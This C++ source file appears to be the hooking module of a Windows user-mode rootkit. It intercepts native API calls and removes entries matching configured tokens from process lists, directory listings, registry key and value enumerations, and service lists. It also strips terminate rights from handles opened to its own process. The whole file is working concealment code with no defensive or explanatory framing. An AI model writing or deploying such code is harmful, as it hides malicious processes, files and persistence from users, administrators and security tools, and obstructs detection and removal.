#include "hooks.h"

#include "config.h"

#ifndef STATUS_SUCCESS
#define STATUS_SUCCESS ((NTSTATUS)0x00000000L)
#endif

pNtQuerySystemInformation OriginalNtQuerySystemInformation = nullptr;
pNtQueryDirectoryFile OriginalNtQueryDirectoryFile = nullptr;
pNtEnumerateKey OriginalNtEnumerateKey = nullptr;
pNtEnumerateValueKey OriginalNtEnumerateValueKey = nullptr;
pNtOpenProcess OriginalNtOpenProcess = nullptr;
pEnumServicesStatusExW OriginalEnumServicesStatusExW = nullptr;

namespace
{
	// A bounded wide string: Windows name buffers are not necessarily
	// null-terminated, so the length is always carried along.
	struct WideName
	{
		const wchar_t* lpBuffer;
		size_t Length;
	};

	// Walk a NextEntryOffset linked list and unlink every entry whose name
	// matches a hidden token, whatever the entry type is.
	template <typename TEntry, typename TGetName>
	void FilterHiddenEntries(PVOID lpBuffer, TGetName getEntryName)
	{
		auto lpNext = static_cast<TEntry*>(lpBuffer);
		TEntry* lpCurrent = nullptr;

		do
		{
			lpCurrent = lpNext;
			lpNext = reinterpret_cast<TEntry*>(reinterpret_cast<DWORD_PTR>(lpCurrent) + lpCurrent->NextEntryOffset);

			const WideName name = getEntryName(lpNext);
			if (Config::Matches(name.lpBuffer, name.Length))
			{
				if (lpNext->NextEntryOffset == 0)
					lpCurrent->NextEntryOffset = 0;
				else
					lpCurrent->NextEntryOffset += lpNext->NextEntryOffset;

				lpNext = lpCurrent;
			}

		} while (lpCurrent->NextEntryOffset != 0);
	}

	WideName GetKeyName(const KEY_INFORMATION_CLASS keyInformationClass, PVOID lpInformation)
	{
		switch (keyInformationClass)
		{
			case KEY_INFORMATION_CLASS::KeyBasicInformation:
			{
				const auto lpBasic = static_cast<PKEY_BASIC_INFORMATION>(lpInformation);
				return { lpBasic->Name, lpBasic->NameLength / sizeof(wchar_t) };
			}
			case KEY_INFORMATION_CLASS::KeyNodeInformation:
			{
				const auto lpNode = static_cast<PKEY_NODE_INFORMATION>(lpInformation);
				return { lpNode->Name, lpNode->NameLength / sizeof(wchar_t) };
			}
			case KEY_INFORMATION_CLASS::KeyNameInformation:
			{
				const auto lpName = static_cast<PKEY_NAME_INFORMATION>(lpInformation);
				return { lpName->Name, lpName->NameLength / sizeof(wchar_t) };
			}
			default:
				return { nullptr, 0 };
		}
	}

	WideName GetValueName(const KEY_VALUE_INFORMATION_CLASS keyValueInformationClass, PVOID lpInformation)
	{
		switch (keyValueInformationClass)
		{
			case KEY_VALUE_INFORMATION_CLASS::KeyValueBasicInformation:
			{
				const auto lpBasic = static_cast<PKEY_VALUE_BASIC_INFORMATION>(lpInformation);
				return { lpBasic->Name, lpBasic->NameLength / sizeof(wchar_t) };
			}
			case KEY_VALUE_INFORMATION_CLASS::KeyValueFullInformation:
			{
				const auto lpFull = static_cast<PKEY_VALUE_FULL_INFORMATION>(lpInformation);
				return { lpFull->Name, lpFull->NameLength / sizeof(wchar_t) };
			}
			default:
				return { nullptr, 0 };
		}
	}

	// NtEnumerateKey / NtEnumerateValueKey return a single entry per call, so
	// hidden entries are skipped and the visible list is compacted. This cursor
	// keeps sequential enumeration consistent (no duplicated entries).
	struct EnumerateCursor
	{
		bool  Valid;
		ULONG CallerIndex;
		ULONG OriginalIndex;
	};

	thread_local EnumerateCursor g_keyCursor{};
	thread_local EnumerateCursor g_valueCursor{};

	ULONG ResolveOriginalIndex(const EnumerateCursor& cursor, const ULONG callerIndex)
	{
		if (cursor.Valid && cursor.CallerIndex + 1 == callerIndex)
			return cursor.OriginalIndex + 1;

		return callerIndex;
	}
}

NTSTATUS WINAPI HookedNtQuerySystemInformation(SYSTEM_INFORMATION_CLASS SystemInformationClass, PVOID SystemInformation, ULONG SystemInformationLength, PULONG ReturnLength)
{
	const NTSTATUS queryStatus = OriginalNtQuerySystemInformation(SystemInformationClass, SystemInformation, SystemInformationLength, ReturnLength);
	if (Config::IsEnabled() && SystemInformationClass == SYSTEM_INFORMATION_CLASS::SystemProcessInformation && queryStatus == STATUS_SUCCESS)
	{
		FilterHiddenEntries<SYSTEM_PROCESS_INFORMATION>(SystemInformation, [](PSYSTEM_PROCESS_INFORMATION lpEntry)
		{
			return WideName{ lpEntry->ImageName.Buffer, lpEntry->ImageName.Length / sizeof(wchar_t) };
		});
	}

	return queryStatus;
}

NTSTATUS WINAPI HookedNtQueryDirectoryFile(HANDLE FileHandle, HANDLE Event, PIO_APC_ROUTINE ApcRoutine, PVOID ApcContext, PIO_STATUS_BLOCK IoStatusBlock, PVOID FileInformation, ULONG Length, FILE_INFORMATION_CLASS FileInformationClass, BOOLEAN ReturnSingleEntry, PUNICODE_STRING FileName, BOOLEAN RestartScan)
{
	const NTSTATUS queryStatus = OriginalNtQueryDirectoryFile(FileHandle, Event, ApcRoutine, ApcContext, IoStatusBlock, FileInformation, Length, FileInformationClass, ReturnSingleEntry, FileName, RestartScan);
	if (Config::IsEnabled() && FileInformationClass == FILE_INFORMATION_CLASS::FileIdBothDirectoryInformation && queryStatus == STATUS_SUCCESS)
	{
		FilterHiddenEntries<FILE_ID_BOTH_DIR_INFORMATION>(FileInformation, [](PFILE_ID_BOTH_DIR_INFORMATION lpEntry)
		{
			return WideName{ lpEntry->FileName, lpEntry->FileNameLength / sizeof(wchar_t) };
		});
	}

	return queryStatus;
}

NTSTATUS WINAPI HookedNtEnumerateKey(HANDLE KeyHandle, ULONG Index, KEY_INFORMATION_CLASS KeyInformationClass, PVOID KeyInformation, ULONG Length, PULONG ResultLength)
{
	if (!Config::IsEnabled())
		return OriginalNtEnumerateKey(KeyHandle, Index, KeyInformationClass, KeyInformation, Length, ResultLength);

	ULONG originalIndex = ResolveOriginalIndex(g_keyCursor, Index);
	NTSTATUS queryStatus = OriginalNtEnumerateKey(KeyHandle, originalIndex, KeyInformationClass, KeyInformation, Length, ResultLength);

	while (queryStatus == STATUS_SUCCESS)
	{
		const WideName name = GetKeyName(KeyInformationClass, KeyInformation);
		if (!Config::Matches(name.lpBuffer, name.Length))
			break;

		queryStatus = OriginalNtEnumerateKey(KeyHandle, ++originalIndex, KeyInformationClass, KeyInformation, Length, ResultLength);
	}

	if (queryStatus == STATUS_SUCCESS)
		g_keyCursor = { true, Index, originalIndex };
	else
		g_keyCursor.Valid = false;

	return queryStatus;
}

NTSTATUS WINAPI HookedNtEnumerateValueKey(HANDLE KeyHandle, ULONG Index, KEY_VALUE_INFORMATION_CLASS KeyValueInformationClass, PVOID KeyValueInformation, ULONG Length, PULONG ResultLength)
{
	if (!Config::IsEnabled())
		return OriginalNtEnumerateValueKey(KeyHandle, Index, KeyValueInformationClass, KeyValueInformation, Length, ResultLength);

	ULONG originalIndex = ResolveOriginalIndex(g_valueCursor, Index);
	NTSTATUS queryStatus = OriginalNtEnumerateValueKey(KeyHandle, originalIndex, KeyValueInformationClass, KeyValueInformation, Length, ResultLength);

	while (queryStatus == STATUS_SUCCESS)
	{
		const WideName name = GetValueName(KeyValueInformationClass, KeyValueInformation);
		if (!Config::Matches(name.lpBuffer, name.Length))
			break;

		queryStatus = OriginalNtEnumerateValueKey(KeyHandle, ++originalIndex, KeyValueInformationClass, KeyValueInformation, Length, ResultLength);
	}

	if (queryStatus == STATUS_SUCCESS)
		g_valueCursor = { true, Index, originalIndex };
	else
		g_valueCursor.Valid = false;

	return queryStatus;
}

NTSTATUS WINAPI HookedNtOpenProcess(PHANDLE ProcessHandle, ACCESS_MASK DesiredAccess, POBJECT_ATTRIBUTES ObjectAttributes, PCLIENT_ID ClientId)
{
	if (Config::IsEnabled() && ClientId != nullptr && ClientId->UniqueProcess == reinterpret_cast<HANDLE>(static_cast<ULONG_PTR>(GetCurrentProcessId())))
	{
		DesiredAccess &= ~PROCESS_TERMINATE;
	}

	return OriginalNtOpenProcess(ProcessHandle, DesiredAccess, ObjectAttributes, ClientId);
}

BOOL WINAPI HookedEnumServicesStatusExW(SC_HANDLE hSCManager, SC_ENUM_TYPE InfoLevel, DWORD dwServiceType, DWORD dwServiceState, LPBYTE lpServices, DWORD cbBufSize, LPDWORD pcbBytesNeeded, LPDWORD lpServicesReturned, LPDWORD lpResumeHandle, LPCWSTR pszGroupName)
{
	const BOOL result = OriginalEnumServicesStatusExW(hSCManager, InfoLevel, dwServiceType, dwServiceState, lpServices, cbBufSize, pcbBytesNeeded, lpServicesReturned, lpResumeHandle, pszGroupName);
	if (Config::IsEnabled() && result && InfoLevel == SC_ENUM_PROCESS_INFO && lpServices != nullptr && lpServicesReturned != nullptr)
	{
		auto lpEntries = reinterpret_cast<LPENUM_SERVICE_STATUS_PROCESSW>(lpServices);

		const DWORD count = *lpServicesReturned;
		DWORD written = 0;
		for (DWORD read = 0; read < count; ++read)
		{
			if (Config::Matches(lpEntries[read].lpServiceName) || Config::Matches(lpEntries[read].lpDisplayName))
				continue;

			if (written != read)
				lpEntries[written] = lpEntries[read];

			++written;
		}

		*lpServicesReturned = written;
	}

	return result;
}
